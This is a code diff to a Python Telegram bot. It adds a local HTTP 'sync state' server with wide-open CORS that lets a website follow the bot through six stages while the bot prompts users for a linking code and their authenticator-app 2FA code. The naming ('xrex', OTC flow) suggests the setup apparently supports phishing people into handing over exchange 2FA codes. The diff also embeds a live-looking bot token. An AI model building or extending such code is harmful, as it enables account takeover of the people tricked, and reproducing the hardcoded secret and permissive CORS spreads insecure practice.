@@ -9,6 +9,12 @@ import random
 import string
 import json
 import traceback
+import time
+
+try:
+    from aiohttp import web
+except Exception:
+    web = None
 
 # Configure detailed logging
 logging.basicConfig(
@@ -21,6 +27,58 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = "8052956286:AAHDCvxEzQej-xvR0TUyLNwf0bzPlgcn3dY"
 
 user_state = {}
+
+# Lightweight local sync state server (prototype)
+sync_state = {
+    'stage': 1,                 # 1..6 matching website states
+    'twofa_verified': False,    # becomes True when BOTC158 2FA accepted
+    'linking_code': None,       # e.g., NDG341F
+    'updated_at': int(time.time())
+}
+
+def set_sync_state(stage: int = None, twofa_verified: bool = None, linking_code: str = None):
+    try:
+        if stage is not None:
+            sync_state['stage'] = int(stage)
+        if twofa_verified is not None:
+            sync_state['twofa_verified'] = bool(twofa_verified)
+        if linking_code is not None:
+            sync_state['linking_code'] = str(linking_code)
+        sync_state['updated_at'] = int(time.time())
+    except Exception:
+        pass
+
+async def make_sync_app():
+    if web is None:
+        return None
+    app = web.Application()
+
+    @web.middleware
+    async def cors_mw(request, handler):
+        if request.method == 'OPTIONS':
+            resp = web.Response(status=200)
+        else:
+            resp = await handler(request)
+        # Permissive CORS for prototype
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
+        resp.headers['Access-Control-Allow-Headers'] = '*'
+        return resp
+
+    app.middlewares.append(cors_mw)
+
+    async def get_state(request):
+        return web.json_response(sync_state)
+
+    async def reset_state(request):
+        set_sync_state(stage=1, twofa_verified=False, linking_code=None)
+        return web.json_response({'ok': True})
+
+    app.add_routes([
+        web.route('*', '/xrex/state', get_state),
+        web.route('*', '/xrex/reset', reset_state),
+    ])
+    return app
 
 def generate_verification_code():
     """Generate a random 6-digit verification code."""
@@ -75,6 +133,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     'pinned_instruction_message_id': sent.message_id,
                     'linking_code': 'NDG341F'
                 }
+                # Expose expected next stage to website (move website to state 3 to prep, or keep 1)
+                set_sync_state(stage=3, twofa_verified=False, linking_code='NDG341F')
                 logger.info(f"Sent and pinned BOTC158 linking prompt to user {user_id}")
             except Exception as e:
                 logger.error(f"Error sending BOTC158 message to user {user_id}: {str(e)}")
@@ -683,10 +743,14 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 state['awaiting_2fa'] = False
                 state['final_pinned_message_id'] = final_msg.message_id
                 user_state[user_id] = state
+                # Update local sync server state so website can advance to state 4
+                set_sync_state(stage=4, twofa_verified=True, linking_code=linking_code)
                 return
             else:
-                # Gentle reminder only
-                await update.message.reply_text("Please enter the 6-digit 2FA code from your authenticator app.")
+                # Gentle reminder only (do not unpin original instruction)
+                await update.message.reply_text(
+                    "❌ The 2FA code you entered is incorrect or expired. Please try again with a valid code."
+                )
                 return
 
         # Normal OTC flow handling
@@ -740,11 +804,26 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def main():
     application = None
+    runner = None
     try:
         logger.info("Starting bot...")
         application = ApplicationBuilder().token(BOT_TOKEN).build()
         await application.initialize()
         await check_webhook(application.bot)
+
+        # Start local sync HTTP server (127.0.0.1:8787) if aiohttp is available
+        try:
+            app = await make_sync_app()
+            if app is not None:
+                runner = web.AppRunner(app)
+                await runner.setup()
+                site = web.TCPSite(runner, '127.0.0.1', 8787)
+                await site.start()
+                logger.info("Local sync server running at http://127.0.0.1:8787/xrex/state")
+            else:
+                logger.warning("aiohttp not installed; local sync server disabled")
+        except Exception as e:
+            logger.error(f"Failed to start local sync server: {str(e)}")
         
         # Register handlers in correct order: web app data first, then others, debug last
         application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_web_app_data), group=0)
@@ -785,6 +864,11 @@ async def main():
                 logger.info("Application shut down successfully.")
             except Exception as shutdown_e:
                 logger.error(f"Error during shutdown: {str(shutdown_e)}")
+        if runner:
+            try:
+                await runner.cleanup()
+            except Exception:
+                pass
 
 if __name__ == "__main__":
     try:
